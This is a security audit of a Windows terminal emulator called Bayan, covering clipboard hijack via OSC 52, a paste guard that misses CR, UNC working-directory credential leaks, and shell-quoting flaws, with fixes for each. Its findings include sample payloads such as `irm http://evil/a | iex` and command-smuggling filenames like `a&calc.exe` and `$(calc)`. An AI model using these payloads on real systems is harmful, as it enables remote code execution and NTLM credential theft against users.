# Bayan security audit

**Date:** 2026-10-22
**Scope:** the Bayan tree as of `main` (`d740bae`). Application code under `src/`, `build.rs`, `Cargo.toml` / `Cargo.lock`, and `.github/workflows/ci.yml`.
**Out of scope:** the EasyTer Python tree, Windows runtime behavior that cannot be executed on this host, and vulnerabilities that exist only inside oh-my-posh, ConPTY, or the GPU driver.

This review did not change product code. The only added file is this document.

## How this was checked

| Check | Result |
|---|---|
| Read of every first-party module (`main.rs`, `term.rs`, `render.rs`, `gpu.rs`, `bidi.rs`, `config.rs`, `plugins.rs`, `posh.rs`, `shells.rs`, `keys.rs`, `keybinds.rs`, `toast.rs`) | Done |
| Standalone reproduction of the pure functions (OSC 52 / OSC 9;9 scanners, carry window, paste guard, drop quoting, profile rewrite, PowerShell quoting, `split_command`) | **8/8 tests passed** |
| `cargo test`, `cargo clippy`, `cargo build` of the Bayan crate | **Not run.** See below |
| `cargo audit` 0.21.2 | **Could not load the advisory DB** (CVSS 4.0 parse error). A manual match of the fetched RustSec database against `Cargo.lock` was done instead |

The reproduction harness copied the cited functions verbatim into a scratch crate (`base64` 0.23.0, the same major the lockfile resolves for Bayan) and asserted the outputs below. It was not committed.

**Why the product crate was not built.** This host has rustc/cargo 1.83.0. `Cargo.toml` declares `rust-version = "1.89"`, and `cargo check` fails earlier than that: transitive `pxfm` 0.1.30 requires Cargo edition 2024. Independently, the crate is Windows-only. `toast.rs` imports `windows-sys` with no `cfg`, CI says so explicitly, and a Linux job would not compile. Nothing below that is marked "confirmed by test" depends on that build. Shell-language effects (PowerShell double-quote expansion, `wsl.exe` argument rules, NTLM-on-UNC) are cited as platform behavior and were **not** executed here.

**Confidence labels used below**

- **Tested** — the cited function was executed in the scratch harness and the unsafe output was observed.
- **Inspected** — the call path was read and there is no branch that avoids it. Not executed inside the Bayan binary.
- **Platform** — the Windows or shell consequence of that output. Not executed on this host.

## Executive summary

Bayan is a single-user desktop terminal. It does not listen on a socket, expose a named pipe, embed an LLM, or download updates. The dangerous boundary is the one every terminal has: **bytes from the PTY are untrusted**, including over SSH, from `type`/`Get-Content`, and from anything a local shell prints. Several features treat those bytes as instructions to the rest of the desktop.

The practical attacks are:

1. **Silent clipboard overwrite (OSC 52), then a paste that runs.** A program inside the terminal can replace the Windows clipboard with no focus check, no prompt, and no size cap. The paste guard, which exists specifically to stop multi-line pastes from executing, does not treat CR as a newline. ConPTY treats CR as Enter (`keys.rs` sends `\r` for Enter). The default PowerShell is started with `-NoProfile` and the injected startup script never turns bracketed paste on. Chain: remote output sets the clipboard to `irm http://evil/a \| iex\r`; the user pastes; the command runs and the guard stays closed.
2. **OSC 9;9 chooses the next process's working directory, including a UNC path.** The string is stored, shown as the tab title, written to `~/.bayan/session.json` on quit, and later passed to `Path::is_dir` and `CommandBuilder::cwd`. On Windows, probing `\\attacker\share` authenticates over SMB and can leak the user's NTLMv2 material. That probe happens on the next new tab, split, or relaunch — the user does not have to type the path.
3. **Drag-and-drop quoting does not produce a PowerShell literal.** Paths with spaces are wrapped in double quotes. PowerShell expands `$(...)` inside double quotes. Paths without spaces are not quoted at all, so `&` reaches `cmd.exe` as a statement separator. The bytes are written straight to the PTY.
4. **The prompt picker writes theme filenames into `$PROFILE` unescaped**, inside the double quotes the profile already uses, and renders every theme by spawning `oh-my-posh` on the UI thread with no timeout.

Dependency review did not turn up an unpatched RustSec vulnerability in the locked versions. `ttf-parser` 0.25.1 (via `fontdb`) is flagged unmaintained. CI does not pin third-party actions and does not set a `permissions` block.

There is no Critical finding. Nothing here is unauthenticated remote code execution against a Bayan that is merely running. Every High finding needs either terminal output the user (or their shell) produced, or a file the user then selects.

## Findings

| ID | Severity | Location | Issue | Confidence |
|---|---|---|---|---|
| BAYAN-001 | High | `src/term.rs:255`, `src/main.rs:2227` | OSC 52 writes the OS clipboard unconditionally | Tested + inspected |
| BAYAN-002 | High | `src/term.rs:690`, `src/term.rs:714` | Paste guard ignores CR, so a paste executes | Tested + inspected |
| BAYAN-003 | High | `src/term.rs:265`, `src/term.rs:569`, `src/main.rs:1471` | OSC 9;9 cwd is persisted and used as a process directory, including UNC | Tested + inspected + platform |
| BAYAN-004 | High | `src/term.rs:701`, `src/main.rs:2380` | Dropped paths are not shell-literal | Tested + platform |
| BAYAN-005 | Medium | `src/posh.rs:93`, `src/posh.rs:111` | Theme filename is interpolated into `$PROFILE` | Tested + platform |
| BAYAN-006 | Medium | `src/posh.rs:121`, `src/main.rs:725` | Prompt picker runs `oh-my-posh` on every theme, on the UI thread, unbounded | Inspected + platform |
| BAYAN-007 | Medium | `src/plugins.rs:117`, `src/main.rs:828` | Plugin palette actions write arbitrary bytes to the shell, past the paste guard | Inspected |
| BAYAN-008 | Medium | `src/shells.rs:128`, `src/term.rs:76` | WSL distro names are whitespace-split into extra `wsl.exe` arguments | Tested + platform |
| BAYAN-009 | Medium | `.github/workflows/ci.yml:21` | CI actions are unpinned and the workflow sets no token permissions | Inspected |
| BAYAN-010 | Low | `src/main.rs:2148`, `src/main.rs:2642` | Release builds still honor debug hooks, including `BAYAN_TYPE` and key logging | Inspected |
| BAYAN-011 | Low | `src/keybinds.rs:297` | Config keybinds are not passed through `is_bindable` | Inspected |
| BAYAN-012 | Low | `src/main.rs:2271`, `src/main.rs:1167` | Tab title, toast body, and cockpit text are attacker-influenced | Inspected |
| BAYAN-013 | Low | `src/term.rs:299` | An unparsable OSC 133 exit code is reported as success | Inspected |
| BAYAN-014 | Low | `src/main.rs:1501`, `src/main.rs:665` | Session restore spawns one process per saved tab, with no cap; `quit` does not kill children | Inspected |
| BAYAN-015 | Low | `src/term.rs:628` | `Mutex::lock().unwrap()` on the PTY reader turns a panic into a dead terminal | Inspected |
| BAYAN-016 | Low | `src/term.rs:86` | `split_command` cuts the program at the first `.exe` substring | Inspected |
| BAYAN-017 | Info | `Cargo.lock` (`ttf-parser` 0.25.1) | Transitive font parser is unmaintained (RUSTSEC-2026-0192) | Inspected (advisory DB) |

### BAYAN-001 — High — OSC 52 writes the clipboard with no policy

`scan_osc52` (`src/term.rs:255`) base64-decodes the last `ESC ] 52 ; …` payload and returns it. `process_chunk` (`src/term.rs:372`) runs that scanner on every PTY read. The reader thread sends `UserEvent::ClipboardSet`, and the UI thread calls `arboard` (`src/main.rs:2227`, `src/main.rs:1709`).

There is no config switch, no "window is focused" check, no confirmation, and no length cap. `EventProxy` (`src/term.rs:521`) drops alacritty's own `ClipboardStore` / `ClipboardLoad` events, so this custom scanner is the only writer — and it does not consult `alacritty_terminal`'s `Osc52` policy (the library default is copy-only, with an off switch Bayan never reaches).

`last_osc_payload` (`src/term.rs:236`) does **not** require BEL or ST. It returns bytes up to the next BEL, ESC, or the end of the buffer. A short unterminated sequence is held in the 4096-byte carry window (`MAX_CARRY`, `src/term.rs:20`). A sequence whose ESC has slid out of that window is treated as finished.

**Tested**

- `ESC ] 52 ; c ; aGVsbG8=` with no BEL and no ST decodes to `hello`.
- `ESC ] 52 ; c ; ? BEL` (the clipboard query) returns `None`. Reads are not implemented. This is not the Warp OSC 52 read bug (GHSA-wgqj-4c26-7c4g / CVE-2026-48725).
- The last of two OSC 52 sequences in one buffer wins.
- A 5000-byte unterminated `ESC ] 52 ; …` is not carried (`incomplete_tail_start` returns the buffer length), so the scanner will see it.

One PTY read is 64 KiB (`src/term.rs:622`) plus at most one carry, so a single clipboard set is bounded by that. Repetition is not. A background SSH session, `type` of a log, or `curl` of a binary can replace the clipboard while the user is in another window.

**Fix.** Default OSC 52 to off. If it stays on: require the window to be focused, confirm or show a toast, cap the decoded length (a few kilobytes), require a real BEL/ST terminator, and delete the parallel scanner in favor of alacritty's `ClipboardStore` gated by `Osc52`.

### BAYAN-002 — High — the paste guard does not see CR

`needs_paste_guard` (`src/term.rs:690`) fires only when the text contains `\n` or is longer than 2000 **bytes**. `normalize_paste` (`src/term.rs:714`) rewrites `\n` and `\r\n` to `\r` and otherwise leaves `\r` untouched. With bracketed paste off, those CRs are sent to the PTY as Enter.

The default shell is PowerShell started with `-NoProfile` (`src/term.rs:577`). `PS_MARKS` (`src/term.rs:98`) injects OSC 133 and does not enable bracketed paste (`\x1b[?2004h`). PSReadLine, which is what usually requests that mode, is not loaded. `cmd.exe` does not request it either. The in-tree bracketed-paste stripping (`\x1b[201~`) only helps after the child has turned the mode on.

Enter in this codebase is the byte `\r` (`src/keys.rs:47`, and `Session::write` at `src/term.rs:667` treats `\r` as "the user submitted a command"). A clipboard payload that uses CR instead of LF is the same event.

**Tested**

- `needs_paste_guard("echo hi\recho pwned\r")` is `None`.
- `normalize_paste` of that string, bracketed-paste off, is the same string, CRs intact.
- `"whoami\r" * 200` (1400 bytes) still does not trip the guard.
- The LF form `"echo hi\necho pwned\n"` does trip it. The guard's stated purpose works for LF only.

**Chain with BAYAN-001 (tested scanner, inspected wiring).** OSC 52 of `irm http://evil/a | iex\r` decodes to that exact string, and `needs_paste_guard` returns `None`. The user pastes (Ctrl+V / Ctrl+Shift+V) what they believe is their own clipboard. The first command is submitted immediately. No confirmation card.

**Fix.** Treat `\r`, `\n`, `\u{2028}`, and `\u{2029}` as line breaks. Count characters, not bytes, against the size cap. Enable bracketed paste in the PowerShell startup script, and keep the guard in front even when the mode is on (a child can turn it off). Strip other C0 controls from a paste or run them through the same confirm path.

### BAYAN-003 — High — OSC 9;9 becomes the next shell's directory

`scan_cwd` (`src/term.rs:265`) keeps the last `ESC ] 9 ; 9 ;` payload, strips quotes and trailing slashes, and stores it on `SessionMeta::cwd`. It does not check that the path is local, absolute, or a reasonable length. `UserEvent::Cwd` (`src/main.rs:2271`) publishes the basename as the tab title.

That string is then:

- the cwd of the next tab (`src/main.rs:844`) and the next split (`src/main.rs:1404`);
- written to `~/.bayan/session.json` on every quit (`src/main.rs:1471`);
- restored on the next launch (`src/main.rs:1501`) and passed to `Session::spawn`.

`spawn` (`src/term.rs:569`) keeps the path when `Path::is_dir` is true and calls `CommandBuilder::cwd`. On Windows, `is_dir` and `SetCurrentDirectory` on a UNC path open SMB. Authentication happens on the probe, including when the share does not exist, and can disclose the interactive user's NTLMv2 response to the host named in the path. A successful probe also starts the shell with that share as its current directory.

The path is **not** interpolated into the PowerShell `-Command` string. This is a filesystem and credential issue, not a quoting bug. `\\?\UNC\…` and `\\?\C:\…` are not rejected either. `C:\Windows\System32` is a normal directory, so a shell can be aimed there on purpose by terminal output; `launcher_dir` refuses System32 for the shortcut's "Start in" (`src/term.rs:38`) and then session restore ignores that rule.

**Tested:** the scanner returns `\\evil.example\share\secret`, `"\\evil.example\share"` (quotes removed), and `C:\Windows\System32`, unchanged.

**Inspected:** `save_state` persists `meta.cwd` with no validation. **Platform (not executed here):** UNC filesystem APIs authenticate over SMB.

**Fix.** Accept a cwd only if it is a drive-letter path (`X:\…`) after canonicalization, reject `\\`, `//`, and `\\?\`, cap the length, and call `is_dir` only after that filter. Do not write an unvalidated cwd into `session.json`. Apply the same System32 refusal used for the launcher directory.

### BAYAN-004 — High — drag-and-drop is not a shell literal

`dropped_path_arg` (`src/term.rs:701`) rewrites slashes and, only when the path contains a space or a tab, wraps it in double quotes with `\"` for embedded quotes. `WindowEvent::DroppedFile` (`src/main.rs:2380`) writes that string to the focused PTY immediately, with no paste guard. The trailing byte is a space, not CR, so the line is not submitted by the drop itself. It runs on the next Enter, which is how a dropped path is used.

Windows filenames may contain `$`, `(`, `)`, `` ` ``, `&`, `;`, `%`, and `!`. They may not contain `"`, so the `\"` escape does not cover the characters that matter.

**Tested**

| Path | Bytes written to the PTY |
|---|---|
| `C:\tmp\a&calc.exe` | `C:\tmp\a&calc.exe ` (unquoted) |
| `C:\tmp\$(calc).txt` | `C:\tmp\$(calc).txt ` (unquoted) |
| `C:\My Files\$(calc).txt` | `"C:\My Files\$(calc).txt" ` |

**Platform.** In PowerShell, double quotes expand `$(…)`, subexpressions, and backtick escapes. A quoted path is not a literal. In `cmd.exe`, an unquoted `&` is a command separator, and `%VAR%` expands inside double quotes. The default shell is PowerShell (`src/term.rs:19`).

The same write lands in whatever is reading the PTY, including a password prompt or a TUI, not only an interactive shell.

**Fix.** Quote for the shell that is actually running. For PowerShell, single quotes with `'` doubled (the same transform already used for the oh-my-posh path in `src/term.rs:591`). For `cmd.exe`, caret-escape metacharacters. Refuse paths containing C0 controls. Do not drop into a pane whose mode is not a cooked shell prompt, or confirm first.

### BAYAN-005 — Medium — applying a theme writes its filename into `$PROFILE`

`rewrite_config` (`src/posh.rs:93`) replaces the config path inside the first `oh-my-posh init pwsh --config "…"` line. The theme name is the file stem of a `*.omp.json` in the themes directory (`src/posh.rs:52`). `set_theme` (`src/posh.rs:111`) writes the result back to `Microsoft.PowerShell_profile.ps1`. Nothing checks the stem against a safe alphabet.

The surrounding quotes in the managed line are double quotes. PowerShell expands `$(…)` and backtick escapes inside double quotes. `"` cannot appear in a Windows filename, so a quote breakout is not available; `$`, `(`, `)`, and `` ` `` can.

**Tested.** Starting from a normal managed line, `rewrite_config(profile, "$(calc)")` produces a line that still contains `"$env:USERPROFILE\.poshthemes\$(calc).omp.json"`. `rewrite_config(profile, "night-owl`ncalc")` leaves the backtick sequence in that same double-quoted string. The picker draws the raw stem (`src/render.rs:2129`) clipped to the window, so a long stem can hide the payload past the right edge.

The user has to press Enter on that row. The write is persistent: every later PowerShell that loads `$PROFILE` parses it, including Windows Terminal and VS Code, not only Bayan. Bayan's own tabs use `-NoProfile` and re-inject the path through the single-quoted form, which **is** escaped — see the positive note below. The profile rewrite is the unescaped one.

**Fix.** Accept a theme name only if it matches `^[A-Za-z0-9._-]{1,64}$` and the joined path stays inside the themes directory. Write the profile with a single-quoted path, or escape for the quote style already in the file.

### BAYAN-006 — Medium — the prompt picker executes every theme on the UI thread

`open_posh` (`src/main.rs:725`) calls `posh::preview` for every name before the window paints again. `preview` (`src/posh.rs:121`) spawns `oh-my-posh print primary --config <file>` and waits for `Command::output()`, which buffers all stdout until the process exits. There is no timeout, no output limit, and the call sits on the UI thread. One theme whose segment runs `Start-Sleep`, or one theme that prints until the pipe fills, freezes Bayan. Hundreds of files in the themes directory means hundreds of processes per Ctrl+Shift+O.

**Platform.** Current oh-my-posh removed the `command` segment in November 2025 because arbitrary execution during prompt render was a security bug. Bayan invokes whatever `oh-my-posh` is on `PATH`. A binary from before that removal, or any segment that still shells out (`git`, which runs hooks in the current repo), runs as the user when the picker opens — including for themes the user never applies. This part was not executed here; the unbounded synchronous spawn is inspected.

**Fix.** Allowlist names (same rule as BAYAN-005). Render on a worker, one at a time, with a timeout, and cap stdout. Do not preview a theme until it is highlighted.

### BAYAN-007 — Medium — plugin actions are a shell-write channel

`~/.bayan/plugins/*.json` is loaded at startup (`src/plugins.rs:198`). An action is a label plus a `send` string (`src/plugins.rs:117`) with no length cap and no restriction on CR. `palette_run` (`src/main.rs:828`) writes `send` to the focused PTY and does not call `needs_paste_guard`.

Built-in palette rows and plugin rows are the same kind of label (`src/main.rs:806`). A plugin can use the same Arabic label as a built-in ("لصق", "تبويب جديد") and there is no badge. Choosing it injects the payload, and a trailing `\r` submits it.

A local process that can write the plugins directory can already run code. The extra problem is that the UI presents the file as a command palette entry the user will click, and it bypasses the control Bayan added for the clipboard. Themes contributed by the same files are data (colors) and are fine.

**Fix.** Show plugin rows in a separate section. Run `send` through `needs_paste_guard` / `normalize_paste`. Cap the string. Default-deny `send` unless the plugin is explicitly enabled.

### BAYAN-008 — Medium — WSL distro names become extra arguments

`detect` (`src/shells.rs:128`) stores `wsl.exe -d {name}` for each line of `wsl -l -q`. `split_command` (`src/term.rs:76`) then splits the remainder on whitespace, because the command line is not a real argv array.

**Tested.** `"wsl.exe -d My Distro"` becomes argv `wsl.exe`, `-d`, `My`, `Distro`. `"wsl.exe -d Ubuntu -e calc.exe"` becomes `-d`, `Ubuntu`, `-e`, `calc.exe`.

**Platform.** `wsl.exe -d <distro> [command]` runs `command` inside the distro. A registered name that contains a space, or that contains further flags, is not one argument. `wsl --import` allows a custom name. The settings label is truncated in the cycler, so the full command line is not what the user reads.

Spawn itself uses `CommandBuilder` argv (`src/term.rs:563`). There is no `cmd /c` around it. The bug is the earlier lossy join-then-split, not `CreateProcess` parsing.

**Fix.** Store `(program, args)` from detection instead of a command line. Pass the distro name as a single `cmd.arg`. Reject names that start with `-` or contain whitespace.

### BAYAN-009 — Medium — GitHub Actions is unpinned and over-privileged by default

`.github/workflows/ci.yml` triggers on `push` to `main`, every `pull_request`, and `workflow_dispatch`. It checks out with `actions/checkout@v5`, installs the toolchain with `dtolnay/rust-toolchain@stable` and `@1.89`, and caches with `Swatinem/rust-cache@v2`. None of those are pinned to a commit SHA. The file sets no `permissions:` key.

The workflow does not use repository secrets, and `pull_request` (not `pull_request_target`) is the right trigger. A compromised tag on a third-party action still runs inside the job. On `push` to `main`, the default `GITHUB_TOKEN` can be writable. The job is Windows and compiles this repo, so a malicious action is code execution on the runner.

**Fix.** Set `permissions: contents: read` at the top. Pin each action to a full SHA. Keep `@stable` only as a comment next to a pinned toolchain action.

### BAYAN-010 — Low — debug hooks are part of the release binary

`BAYAN_TYPE` (`src/main.rs:2148`) writes the environment string to the first PTY with no paste guard. `BAYAN_PROFILE` logs every key, including `event.text`, to `%TEMP%\bayan_profile.log` (`src/main.rs:2642`). `BAYAN_TOAST` shows an arbitrary title as a Bayan notification. These are documented developer hooks and they are not behind `debug_assertions`. A shortcut or parent process that sets the environment gets a shell write or a key log that looks like the real Bayan. A parent that can set the environment can usually launch PowerShell directly; this matters when the thing the user double-clicks is named Bayan.

**Fix.** Compile the hooks only for debug builds, or require a second flag that release installers do not set.

### BAYAN-011 — Low — a config file can bind an action to a bare letter

The shortcuts UI refuses a chord unless `is_bindable` (`src/keybinds.rs:131`): a modifier or an F-key. `effective_map` (`src/keybinds.rs:297`) does not. `Chord::parse("a")` succeeds, so `"paste": "a"` in `config.json` makes the letter `a` invoke paste and swallow the key. Unparseable chords fall back to the default, which is the right failure mode; parseable-but-unbindable chords do not.

**Fix.** Discard a loaded override that fails `is_bindable`, the same way the editor does.

### BAYAN-012 — Low — chrome text follows the PTY

The OS window title is hardcoded (`src/main.rs:1462`, `w.set_title("Bayan — بيان")`). `Event::Title` is ignored (`src/term.rs:530`). OSC 0 / OSC 2 cannot rename the window. That part is in good shape. The README still says OSC 9;9 tracks the cwd into the window title; the code puts the basename on the tab instead.

What the PTY does control:

- the tab title, from the OSC 9;9 basename (`src/main.rs:2272`);
- the cockpit row, from `running_cmd` and `cwd` (`src/main.rs:1167`);
- the toast body on command completion, which is the tab title (`src/main.rs:2264`);
- the close-guard sentence, which embeds `running_cmd`.

Bidi and RTL overrides in a directory name or a captured command can spoof those strings. `running_cmd` is what was on screen when the user pressed Enter (`src/term.rs:390`), so a hostile shell can echo a different command than the one typed. Claude-mode detection (`src/bidi.rs:156`) then decides whether copied Arabic is reversed. A false positive (`npx something claude`, or a manual F2) rewrites the clipboard on copy via `restore_block`. That is integrity of copied text, not code execution.

**Fix.** Sanitize bidi controls in chrome strings. Show the cockpit command in a fixed LTR span. Do not put the raw cwd into a toast.

### BAYAN-013 — Low — a missing exit code looks like success

On OSC 133 `D`, a missing or non-integer code stays `None` (`src/term.rs:219`). The finish notification uses `exit.unwrap_or(0) == 0` (`src/term.rs:301`), and the toast title becomes "اكتمل الأمر" (`src/main.rs:2263`). A program can emit `ESC ] 133 ; D BEL` after a long sleep and get a success toast.

**Fix.** Treat a missing code as unknown and use a neutral title.

### BAYAN-014 — Low — session restore is an unbounded process spawn

`restore_state` (`src/main.rs:1506`) spawns a shell per saved tab and up to three more panes (`cwds.take(3)`). There is no cap on the number of tabs. A tampered `session.json` is a process bomb at startup, and each cwd is an independent BAYAN-003 probe. Weights are checked for finite and positive (`src/main.rs:1526`); the tab count is not.

`quit` (`src/main.rs:665`) removes the tray icon and saves state. It does not call `Session::kill`. There is no `Drop` for `Session`. Closing the ConPTY handle on process exit usually tears the child down; the Git Bash launcher case this repo already documents is the one that detaches. That path is a leak, not a sandbox escape.

**Fix.** Cap restored tabs (for example 16) and panes. `kill` and wait in `quit`, and implement `Drop` so a panic does not orphan the console.

### BAYAN-015 — Low — poisoned mutexes crash the UI

The reader (`src/term.rs:628`) holds both mutexes across `parser.advance` and `unwrap`s the lock. If that thread panics, the mutex is poisoned and the next UI `unwrap` (`src/main.rs` redraw, input, resize) aborts the process. The scanners themselves use bounds checks and `saturating_*` and did not panic under the cases in the harness. No panic-on-input was confirmed in Bayan's own parsers. The failure mode is still "one panic kills the terminal."

**Fix.** `lock().unwrap_or_else(|p| p.into_inner())` on the UI side, and keep the reader from panicking on short reads.

### BAYAN-016 — Low — the first `.exe` wins

`split_command` (`src/term.rs:86`) finds the first case-insensitive `.exe` and treats the rest as argv. That is correct for `C:\Program Files\PowerShell\7\pwsh.exe` and wrong for a path where `.exe` appears earlier (`C:\note.exe\..\pwsh.exe`, or a config `shell` value crafted the same way). The settings cycler only writes detected commands. A hand-edited `config.json` is already "run this program," so this is a parsing footgun, not a new trust boundary.

**Fix.** Prefer an explicit quoted program, then a trailing `.exe`, and reject the value if the program path does not exist.

### BAYAN-017 — Info — `ttf-parser` is unmaintained

`cargo-audit` 0.21.2 aborted while loading the RustSec database: 86 advisories use CVSS 4.0, which that release cannot parse. The database was already fetched. Matching every `package = "…"` against `Cargo.lock` found 36 advisories whose package name appears in the lockfile. Of those, the locked version is inside the advisory's patched or unaffected range, with two informational leftovers:

- **`ttf-parser` 0.25.1** (RUSTSEC-2026-0192, unmaintained), pulled in by `fontdb` 0.23 / `owned_ttf_parser`. It parses installed fonts, not PTY payload. No patched release exists. Upstream points at `skrifa`.
- **`xml-rs` 0.8.28** (RUSTSEC-2022-0048, unmaintained), only through `gl_generator`, a build-time dependency of `glow`. It does not parse terminal data.

Not vulnerabilities in this tree, recorded so the next `cargo audit` is not a surprise:

- `arrayref` is locked at **0.3.9**, which RUSTSEC-2026-0260 marks unaffected. The malicious release was 0.3.10 (yanked the same day, 2026-08-20). Do not bump it blindly.
- `memmap2` is **0.9.11**, the patched floor for RUSTSEC-2026-0186.
- `nix` 0.28.0, `base64` 0.22.1 / 0.23.0, `image` 0.25.10, `anyhow` 1.0.104, `quick-xml` 0.41.0, `shlex` 2.0.1, and the other matched crates sit in their patched ranges.
- No RustSec advisory in that database names `alacritty_terminal`, `vte`, `winit`, `wgpu`, `portable-pty`, or `arboard`.

`rustybuzz` is unmaintained (RUSTSEC-2026-0206) and is **not** in `Cargo.lock`. M20 removed it. Leave it out.

## What was reviewed and is in decent shape

These were looked at because they are the usual terminal bugs. They are not findings.

- **No listener.** No TCP socket, named pipe server, HTTP client, or update downloader in first-party code. "Agent-ready" is the cockpit UI plus Claude-mode BiDi. Bayan does not call a model, so terminal output is not a prompt-injection sink into an LLM. The cockpit spoof in BAYAN-012 is the whole of that surface.
- **OSC 52 read** is ignored (test above). A remote program cannot pull the clipboard back through the PTY via this scanner.
- **OSC window-title injection** does not reach the Win32 title (BAYAN-012).
- **OSC 8 hyperlinks are not opened.** The only OSC 8 handling is the preview painter skipping the payload so it does not show up as text (`src/render.rs:2060`). There is no click-to-open URL path.
- **Scrollback** is clamped to 100..=100_000 (`src/config.rs:156`). Marks are trimmed at 2000 (`src/term.rs:289`).
- **The glyph atlas** stops at 8 pages (`src/render.rs:306`, 16 MB each) and resets. The shaped-run cache is generational with `CACHE_CAP` 4096 (`src/render.rs:780`).
- **Shell spawn is argv, not `cmd /c`.** `CommandBuilder::new(prog)` plus `cmd.arg` (`src/term.rs:563`). A `shell` value of `powershell.exe -NoProfile` does not go through a second shell. The user-controlled config can still name any executable; that is the config file's job.
- **The oh-my-posh path injected at PowerShell startup is single-quoted.** **Tested:** `C:\themes\o'$(calc).omp.json` becomes `'C:\themes\o''$(calc).omp.json'`, which is the correct PowerShell literal escape. BAYAN-005 is the other writer, the profile rewriter, which does not do this.
- **Bracketed-paste breakout** via an embedded `\x1b[201~` is stripped when the mode is on (existing `paste_normalizes_newlines_and_blocks_injection` test). BAYAN-002 is that the default shell never turns the mode on, and CR skips the confirm.
- **Plugin JSON** that is malformed is skipped and does not panic (existing tests in `plugins.rs`). Isolation of a bad theme is real. The gap is the `send` field (BAYAN-007), not the loader.
- **Lock order.** The reader takes `term` then `meta`. Redraw drops `meta` before taking `term` (`src/main.rs:1892`). `jump_command` takes `term` then `meta`. No inversion found.
- **`unsafe` review.** Five sites, none taking PTY bytes:
  - `toast.rs:54` zeroes `NOTIFYICONDATAW`, sets `cbSize` and the fields it uses, then calls `Shell_NotifyIconW`. Ordinary Win32.
  - `shells.rs:68` `GetShortPathNameW` into a 260-unit buffer; `n == 0` or `n >= len` falls back to the long path. The length check is right.
  - `main.rs:53` `MessageBeep`.
  - `main.rs:2197` `RegisterHotKey` for Ctrl+Alt+backtick. The return value is ignored, so a taken hotkey fails silently. Not a memory bug.
  - `main.rs:2850` the winit msg hook dereferences the `MSG` pointer winit documents as valid for the callback. No null check. Acceptable if winit's contract holds.
  - `main.rs:680` `SetWindowLongPtrW` / `SetLayeredWindowAttributes` for the opacity setting. The alpha is clamped (`config.rs:171`).

## Non-security improvements

**Performance**

- `shells::detect` runs `wsl.exe -l -q` on every settings paint and every shell-cycle click (`shell_choices` → `detect`). Cache it for the process, or refresh on a timer.
- BAYAN-006 blocks the UI thread. Even after the security cap, previews should be async.
- The PTY reader holds both mutexes for the whole `parser.advance` of up to 64 KiB (`src/term.rs:628`). A heavy frame cannot paint until the parse finishes. Parse into a side buffer and take the locks only to commit.
- Differential redraw skips the GPU submit when the quad bytes match (`README` M14) but still walks every visible cell and builds the vertex `Vec` first. A generation counter on the grid would skip that too. Do not "fix" this by invalidating state every frame; the shaped-run cache and the idle-frame skip are load-bearing (see `CLAUDE.md`).
- `prof::mark` on the key path formats a string and checks the environment on every keystroke even when profiling is off (`src/main.rs:194` is cheap; the call site at `src/main.rs:2642` still builds the `format!` argument before `mark` returns). Build the line inside `mark`.

**Correctness**

- `is_under` (`src/term.rs:53`) does not understand `\\?\C:\Windows\…`. A launcher directory in the extended form can still start a shell in System32. The same helper should be what BAYAN-003 uses, after it learns both prefixes.
- `GetShortPathNameW` falling back to a long path reintroduces the ConPTY-breaks-on-spaces bug the short path exists to avoid (`src/shells.rs:69`). Surface the failure instead of spawning a shell that cannot take input.
- `Session::resize` casts `rows`/`cols` to `u16` (`src/term.rs:678`). Realistic windows fit. A pathological size truncates.
- The shell-label unit test asserts every detected name is ≤ 20 characters (`src/shells.rs:180`). A legitimate long WSL distro name fails the suite on that machine. Truncate for display, and stop failing CI-shaped tests on host inventory.
- `README.md` M4 says OSC 9;9 updates the window title. `update_title` does not. The README is the project log; that entry is now wrong and it hides BAYAN-012.

**Structure**

- OSC 52 and OSC 9;9 are parsed a second time beside `alacritty_terminal`, which already emits `ClipboardStore` and `Title`. The second parser is how BAYAN-001 ignores the library's policy knob. Handle the library events, or share one limit (terminator required, max bytes) between them.
- `toast.rs`, the Win32 parts of `main.rs`, and `build.rs` are not behind `cfg(windows)` in a way that lets `cargo check` run elsewhere. The pure modules (`bidi`, `keys`, the scanners, config parsing) could live in a target-independent crate so the guards in this audit stay in `cargo test` on Linux. CI is right that the full app is Windows-only; the logic that just failed review is not.
- Debug hooks in release builds (BAYAN-010) make the "build, launch, screenshot" loop easy and also ship to users. Split them.
- There is no `SECURITY.md`, no `cargo deny`, and no audit step in CI. BAYAN-009 is the place to add the last of those, once the runner's `cargo-audit` can read CVSS 4.0 advisories.
- Clippy is informational (`ci.yml` does not pass `-D warnings`). That is a stated choice for `bidi.rs`. Do not turn warnings-as-errors on blindly; do deny the lints that hide real bugs (`unwrap_used` on non-test code would have flagged BAYAN-015).

## Prioritized fix plan

1. **BAYAN-001 and BAYAN-002 together.** They are one pastejack. Gate OSC 52 (default off, focus, terminator, size cap) and teach the paste guard that CR is Enter. Turn bracketed paste on in `PS_MARKS`. This is the remote-output bug; do it first.
2. **BAYAN-003.** Filter cwd to a local drive-letter path before `is_dir`, before `cmd.cwd`, and before `session.json`. This is the credential-leak bug and it survives a restart.
3. **BAYAN-004.** Shell-specific literal quoting for drops, and do not drop into a non-shell reader.
4. **BAYAN-005 and BAYAN-006.** One allowlist for theme stems. Single-quote the profile path. Move preview off the UI thread with a timeout and an output cap.
5. **BAYAN-007.** Paste-guard plugin `send`, and visually separate plugin rows from built-ins.
6. **BAYAN-008.** Stop round-tripping argv through a command string. Pass the distro name as one argument.
7. **BAYAN-009.** `permissions: contents: read`, SHA-pin the three actions.
8. **The Lows, in this order:** debug hooks out of release (010), `is_bindable` on load (011), neutral toast when the exit code is missing (013), cap restored tabs and kill children on quit (014), bidi stripping on chrome strings (012), `split_command` only at a trailing `.exe` (016), non-poisoning locks (015).
9. **Keep `ttf-parser` on a watch list** (017). Do not add `rustybuzz` back. Do not bump `arrayref` off 0.3.9 without reading RUSTSEC-2026-0260.

## Tests worth promoting

The scratch harness is throwaway. The assertions that should live next to the existing `term.rs` / `posh.rs` tests, so this does not regress quietly:

- `needs_paste_guard` rejects a CR-only payload and a CR-separated burst under 2000 bytes.
- `scan_osc52` does not return a payload that has no BEL and no ST, and still returns `None` for `?`.
- `scan_cwd` returns `None` for `\\…`, `//…`, and `\\?\…`.
- `dropped_path_arg` of a path containing `$(calc)` is a single-quoted literal.
- `rewrite_config` refuses a theme stem outside `[A-Za-z0-9._-]`.
- `split_command("wsl.exe -d My Distro")` keeps `My Distro` as one argument, once detection stores real argv.
